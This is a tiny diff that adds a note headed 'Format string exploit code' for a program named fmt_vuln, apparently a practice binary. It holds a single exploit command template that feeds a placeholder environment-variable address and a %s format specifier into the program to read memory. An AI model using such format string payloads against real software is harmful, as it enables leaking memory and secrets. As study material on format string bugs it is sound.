@@ -1,0 +1,8 @@
+[+] Format string exploit code
+
+[+] source name : fmt_vuln
+
+[+] exploit code 
+
+	./fmt_vuln $(printf '{getenv address}')%s
+
